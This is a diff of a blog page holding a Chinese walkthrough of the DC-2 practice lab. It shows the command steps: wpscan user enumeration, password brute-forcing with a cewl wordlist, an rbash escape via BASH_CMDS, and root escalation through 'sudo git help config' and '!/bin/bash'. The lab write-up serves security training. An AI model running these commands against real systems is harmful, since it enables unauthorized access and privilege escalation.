@@ -475,7 +475,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    915
+                    903
                 </div>
                 
 
@@ -507,31 +507,37 @@
 <p>打开之后发现是wordpress4.7.10版本的博客，可以发现flag1。</p>
 <p><a href="https://imgchr.com/i/Bf2wDg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2wDg.png" alt></a></p>
 <h1 id="2-用户收集和尝试爆破"><a href="#2-用户收集和尝试爆破" class="headerlink" title="2.用户收集和尝试爆破"></a>2.用户收集和尝试爆破</h1><p>提示让我们使用cewl，所以我们首先用wpscan扫描网站的用户命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-shell"><code class="language-shell">wpscan --url dc-2 --enumerate u</code></pre>
 <p><a href="https://imgchr.com/i/Bf2c80" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2c80.png" alt></a></p>
 <p>可以看到有admin，jerry，Tom三个用户，在flag1中提示使用cewl，这是一个kali中用于爬取指定URL指定深度的ruby应用，然后将所爬取的内容通过指令输出到指定的文件夹中，在这个靶场中我们用到的命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cewl -w pwd.txt dc-2       将爬取的内容输出到pwd.txt文件中</span><br><span class="line"></span><br><span class="line">cat pwd.txt            顺便查看一下爬取结果</span><br><span class="line"></span><br><span class="line">wpscan --url dc-2 -P pwd.txt -U admin         爆破admin的密码，不用想了肯定爆破不出来</span><br><span class="line"></span><br><span class="line">wpscan --url dc-2 -P pwd.txt -U jerry             爆破jerry的密码，这个是可以得到的</span><br><span class="line"></span><br><span class="line">wpscan --url dc-2 -P pwd.txt -U tom               爆破tom的密码，这个也可以得到</span><br></pre></td></tr></table></figure>
+<pre class=" language-shell"><code class="language-shell">cewl -w pwd.txt dc-2       将爬取的内容输出到pwd.txt文件中
 
+cat pwd.txt            顺便查看一下爬取结果
+
+wpscan --url dc-2 -P pwd.txt -U admin         爆破admin的密码，不用想了肯定爆破不出来
+
+wpscan --url dc-2 -P pwd.txt -U jerry             爆破jerry的密码，这个是可以得到的
+
+wpscan --url dc-2 -P pwd.txt -U tom               爆破tom的密码，这个也可以得到</code></pre>
 <p><a href="https://imgchr.com/i/BfR9PI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfR9PI.png" alt></a></p>
 <p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" alt></a></p>
 <h1 id="3-后台登入"><a href="#3-后台登入" class="headerlink" title="3.后台登入"></a>3.后台登入</h1><p>然后我们使用jerry的账号进行登入wordpress得到后台，这里提示一下一般wordpress的默认登录页面为wp-login.php我们在登录jerry的账号之后发现了flag2提示我们换一种方法进行渗透。</p>
 <p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" alt></a></p>
 <h1 id="4-ssh连接和提权"><a href="#4-ssh连接和提权" class="headerlink" title="4.ssh连接和提权"></a>4.ssh连接和提权</h1><p>然后，我们这时候肯定会感觉抓瞎，而我们在信息收集的时候是不是发现了一个ssh端口，这时候我们通过kali利用tom的账号连接靶机发现连接成功，命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.146.140 -p 7744</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-shell"><code class="language-shell">ssh tom@192.168.146.140 -p 7744</code></pre>
 <p><a href="https://imgchr.com/i/BfWESx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWESx.png" alt></a></p>
 <p>在连接成功之后，ls一下发现了flag3.txt文件，cat一下，发现没有权限，根据提示我们发现tom用户呗rbash了，所谓的rbash就是受限制的shell，瞬间感觉tom用户是真的卑微，不过我们可以直接vi flag3.txt这样我们就可以看到其中的内容。</p>
 <p><a href="https://imgchr.com/i/BfWu0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWu0e.png" alt></a></p>
 <p>打开之后发现解释是tom很老了，也许他需要用其他的方式来抓老鼠，实际上就是提示我们提升tom用户的权限，我在看了很多的提权方法之后，觉得是tom用户权限受限制的原因是环境变量的原因，那么我们下一步就是改变tom的环境变量，命令如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh   ;   a        #调用bin文件下的sh命令解释器</span><br><span class="line">&#x2F;bin&#x2F;bash   #使用bash命令解释器</span><br><span class="line">export PATH&#x3D;PATH:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin  #设置环境变量</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-shell"><code class="language-shell">BASH_CMDS[a]=/bin/sh   ;   a        #调用bin文件下的sh命令解释器
+/bin/bash   #使用bash命令解释器
+export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #设置环境变量</code></pre>
 <p><a href="https://imgchr.com/i/BfW8pt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfW8pt.png" alt></a></p>
 <p>在设置好环境变量之后我们就可以用cd命令，也就是说我们的权限成功提升了，cd到/home下我们看到jerry用户进入jerry用户的文件，看到了flag4.txt文件，我们cat一下发现文件提示我们利用git，所以我们su一下到jerry用户，发现jerry用户可以以root的权限来运行git，这就是一个可以提权的点.</p>
 <p><a href="https://imgchr.com/i/BfWU0g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWU0g.png" alt></a></p>
 <p>然后利用命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config  #进入文件</span><br><span class="line">!&#x2F;bin&#x2F;bash           #成功提权</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-shell"><code class="language-shell">sudo git help config  #进入文件
+!/bin/bash           #成功提权</code></pre>
 <p><a href="https://imgchr.com/i/BfWhN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWhN9.png" alt></a></p>
 <p><a href="https://imgchr.com/i/BfWI91" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWI91.png" alt></a></p>
 <p>我们在成功提权之后直接进入到root目录下就可以看到最终的flag.</p>
